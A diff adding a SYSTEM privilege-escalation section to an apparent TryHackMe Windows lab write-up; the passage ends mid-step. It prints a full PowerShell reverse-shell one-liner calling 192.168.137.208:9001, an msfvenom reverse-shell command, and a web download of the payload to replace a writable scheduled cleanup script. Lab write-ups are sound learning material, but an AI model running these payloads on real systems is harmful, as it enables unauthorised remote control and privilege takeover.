@@ -190,3 +190,101 @@ sc.exe start THMSvc
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2016-38-30.png)
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2016-47-27.png)
+
+
+---
+
+## PrivEsc - SYSTEM
+
+> After dropping the shell, we can go ahead and transfer `winpeas.ps1` to check for privesc trajectories. You can just run `winpeas` in your kali terminal, and it will cd into that directory. Then, use the python http.server to broadcast it. And download it from the victim machine.
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2017-15-51.png)
+
+> Be patient while it runs. From the output, there is an unusual directory: `C:\Windows\Tasks`, where we can discovery a cleanup script called `cleanup.bat`.
+
+```Powershell
+PS C:\Windows\Tasks> ls
+
+    Directory: C:\Windows\Tasks
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        5/11/2026   6:41 AM             41 cleanup.bat                                                           
+
+
+PS C:\Windows\Tasks>
+```
+
+> Let's view the permissions and ownership:
+
+```Powershell
+PS C:\Windows\Tasks> icacls C:\Windows\Tasks
+icacls C:\Windows\Tasks
+C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD)
+                 BUILTIN\Administrators:(F)
+                 BUILTIN\Users:(OI)(CI)(RX)
+                 PRIVESC\svcadmin:(OI)(CI)(M)
+                 BUILTIN\Administrators:(OI)(CI)(F)
+                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
+                 NT AUTHORITY\SYSTEM:(F)
+                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+                 CREATOR OWNER:(OI)(CI)(IO)(F)
+```
+
+> For CMD:
+
+```CMD
+C:\Windows\Tasks>dir /q C:\Windows\Tasks
+
+ Directory of C:\Windows\Tasks
+
+05/11/2026  06:42 AM    <DIR>          NT AUTHORITY\SYSTEM    .
+05/11/2026  06:42 AM    <DIR>          NT SERVICE\TrustedInsta..
+05/11/2026  06:41 AM                41 BUILTIN\Administrators cleanup.bat
+               1 File(s)             41 bytes
+               2 Dir(s)  14,712,745,984 bytes free
+
+C:\Windows\Tasks>
+```
+
+> Unfortunately, the payload I used that could also give me a rev shell did not work:
+
+```Powershell
+PS C:\Windows\Tasks> type cleanup.bat
+
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.137.208',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+```
+
+> So I generated another .exe using msfvenom, and transferred it as cleanup.bat.
+
+> Generate fun.exe
+
+```zsh
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.208 LPORT=9001 -f exe -o fun.exe
+```
+
+> Victim
+
+```Powershell
+PS C:\Invoke-WebRequest -Uri http://192.168.137.208:8000/fun.exe -OutFile C:\Windows\Tasks\cleanup.exe
+
+PS C:\Windows\Tasks> dir
+dir
+
+
+    Directory: C:\Windows\Tasks
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        9/23/2026   2:18 PM           7680 cleanup.bat
+-a----        9/23/2026   2:18 PM           7680 cleanup.exe                                                           
+
+PS C:\Windows\Tasks>
+```
+
+> Overwrite the content with echo:
+
